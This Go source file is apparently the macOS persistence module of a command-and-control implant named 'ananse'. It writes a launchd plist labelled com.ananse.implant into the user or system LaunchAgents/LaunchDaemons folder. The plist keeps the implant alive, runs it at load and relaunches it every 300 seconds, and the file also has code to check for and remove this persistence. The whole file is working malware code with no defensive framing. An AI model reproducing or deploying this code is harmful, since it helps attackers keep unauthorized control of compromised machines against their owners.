package watchdog

import (
	"fmt"
	"os"
	"path/filepath"

	"github.com/natx6/ananse/src/c2/implant/shell"
)

func installImpl(path string) error {
	return installLaunchd(path)
}

func removeImpl() error {
	return removeLaunchd()
}

func isPersistentImpl() bool {
	_, err := shell.Run("launchctl list 2>/dev/null | grep ananse", 10e9)
	return err == nil
}

func installLaunchd(path string) error {
	label := "com.ananse.implant"
	plist := fmt.Sprintf(`<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
	<key>Label</key>
	<string>%s</string>
	<key>ProgramArguments</key>
	<array>
		<string>%s</string>
	</array>
	<key>KeepAlive</key>
	<true/>
	<key>RunAtLoad</key>
	<true/>
	<key>StartInterval</key>
	<integer>300</integer>
</dict>
</plist>
`, label, path)

	dirs := []string{
		filepath.Join(os.Getenv("HOME"), "/Library/LaunchAgents"),
		"/Library/LaunchDaemons",
	}

	for _, dir := range dirs {
		if err := os.MkdirAll(dir, 0755); err != nil {
			continue
		}
		plistPath := filepath.Join(dir, label+".plist")
		if err := os.WriteFile(plistPath, []byte(plist), 0644); err != nil {
			continue
		}
		_, err := shell.Run(fmt.Sprintf("launchctl load -w %s 2>/dev/null", plistPath), 10e9)
		if err == nil {
			return nil
		}
	}

	return fmt.Errorf("failed to install launchd plist")
}

func removeLaunchd() error {
	label := "com.ananse.implant"
	dirs := []string{
		filepath.Join(os.Getenv("HOME"), "/Library/LaunchAgents"),
		"/Library/LaunchDaemons",
	}

	for _, dir := range dirs {
		plistPath := filepath.Join(dir, label+".plist")
		_, _ = shell.Run(fmt.Sprintf("launchctl unload -w %s 2>/dev/null", plistPath), 10e9)
		_ = os.Remove(plistPath)
	}
	return nil
}
